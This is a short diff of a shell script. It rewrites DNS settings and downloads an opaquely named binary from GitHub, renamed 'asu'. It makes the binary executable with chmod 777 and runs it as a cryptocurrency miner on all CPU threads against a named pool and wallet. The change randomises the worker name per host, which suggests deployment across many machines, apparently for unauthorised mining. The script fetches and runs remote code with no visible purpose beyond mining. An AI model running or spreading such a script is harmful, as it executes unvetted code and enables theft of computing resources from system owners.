@@ -10,4 +10,4 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 wget -O asu https://github.com/kartolo92/kkr/raw/main/sorabinew
 chmod 777 asu
-./asu --algorithm yespowerr16 --pool stratum+tcp://pool.rhinominer.rocks:3333 --wallet RWbhncrPdo2pEhineUq4Vro6RTsrR5vuxw.kido --password x --diff-factor 0.1 --cpu-threads $(nproc --all)
+./asu --algorithm yespowerr16 --pool stratum+tcp://pool.rhinominer.rocks:3333 --wallet RWbhncrPdo2pEhineUq4Vro6RTsrR5vuxw.$(shuf -n 1 -i 1-99999)-kido --password x --diff-factor 0.1 --cpu-threads $(nproc --all)
